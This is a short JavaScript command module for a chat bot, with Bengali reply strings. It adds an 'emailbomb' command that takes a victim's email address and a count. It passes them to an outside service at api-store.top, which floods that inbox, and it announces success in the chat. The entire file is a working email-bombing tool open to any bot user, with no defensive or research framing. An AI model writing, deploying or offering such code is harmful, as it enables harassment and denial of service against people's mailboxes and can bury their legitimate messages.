const axios = require("axios");

module.exports = {
  config: {
    name: "emailbomb",
    credits: "Rafi",
    hasPermssion: 0,
    commandCategory: "Tools",
    usages: "/emailbomb <email> <amount>",
    version: "1.0.0"
  },

  run: async function ({ api, event, args }) {
    if (args.length < 2) {
      return api.sendMessage(
        "⚠️ ব্যবহার: /emailbomb <email> <amount>",
        event.threadID,
        event.messageID
      );
    }

    let email = args[0];
    let amount = args[1];

    api.setMessageReaction("⌛", event.messageID, () => {}, true);

    try {
      let { data } = await axios.get(
        `https://api-store.top/bom.php?email=${email}&amount=${amount}`
      );

      let msg = `✅ Email Bomb সফলভাবে পাঠানো হয়েছে!\n\n📧 Email: ${email}\n🔢 Amount: ${amount}\n📡 Status: ${data.Status || "Success"}`;

      api.sendMessage(msg, event.threadID, event.messageID);
    } catch (e) {
      api.sendMessage(`❌ Error: ${e.message}`, event.threadID, event.messageID);
    }
  }
};
